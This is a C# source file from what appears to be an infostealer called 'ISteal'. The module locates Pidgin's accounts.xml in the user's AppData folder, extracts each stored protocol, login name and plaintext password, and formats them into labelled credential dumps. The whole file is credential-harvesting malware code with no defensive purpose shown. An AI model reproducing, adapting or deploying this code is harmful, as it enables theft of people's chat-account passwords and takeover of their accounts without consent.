using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;

namespace ISteal.Password
{
    class Pidgin
    {
        public static List<PassDataPidgin> Initialise()
        {
            var pidgin = new List<PassDataPidgin>();
            string src = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"\\.purple\\accounts.xml");
            if (!File.Exists(src))
            {
                return null;
            }

            var doc = new XmlDocument();
            try
            {
                doc.Load(src);
                foreach (XmlNode node in doc.DocumentElement)
                {
                    pidgin.Add(new PassDataPidgin
                    (
                       node["protocol"] != null ? node["protocol"].InnerText : "",
                       node["name"] != null ? node["name"].InnerText : "",
                       node["password"] != null ? node["password"].InnerText : "")
                    );
                }
            }
            catch { }
            return pidgin;
        }
    }
}

class PassDataPidgin
{
    public string Protocolname { get; private set; }
    public string Login { get; private set; }
    public string Password { get; private set; }

    public PassDataPidgin(string protocol, string login, string password)
    {
        Protocolname = protocol;
        Login = login;
        Password = password;
    }

    public override string ToString() => string.Format("Program : {0}\r\nProtocol : {1}\r\nLogin : {2}\r\nPassword : {3}\r\n——————————————————————————————————",
    new object[]
        {
               "Pidgin",
               Protocolname,
               Login,
              Password,
         }
    );
}